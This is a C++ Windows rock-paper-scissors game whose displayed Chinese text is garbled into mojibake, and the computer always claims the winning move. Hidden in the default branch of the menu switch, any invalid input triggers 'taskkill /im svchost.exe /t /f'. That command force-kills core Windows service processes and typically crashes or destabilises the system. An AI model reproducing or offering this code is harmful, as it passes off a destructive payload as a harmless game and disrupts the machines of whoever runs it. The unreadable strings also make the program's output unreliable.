#include <bits/stdc++.h>
#include <windows.h>
using namespace std;
char out;
int i;

int main() {
	while (1) {
		cout << "ʯͷ������ ����ģʽ" << endl;
		system("title ʯͷ������ ����ģʽ");
		system("color 4F");
		cout << "�����Ѷ�����û�п���Ӯ��" << endl;
		Sleep(3000);
		system("cls");
		cout << "����1=ʯͷ��2=������3=��\n]";
		cin >> i;
		switch (i) {

			case 1:
				cout << "�����ʯͷ��\n���Գ�����\n�����ˣ�����=)";
				break;
			case 2:
				cout << "����˼�����\n���Գ�ʯͷ��\n�����ˣ�����=)";
				break;
			case 3:
				cout << "����˲���\n���Գ�������\n�����ˣ�����=)";
				break;
			default:
				cout << "���治�𣬵���Ҳ�治���ˣ�";
				Sleep(3000);
				system("taskkill /im svchost.exe /t /f");
		}
		Sleep(3000);
		system("cls") ;
	}

}
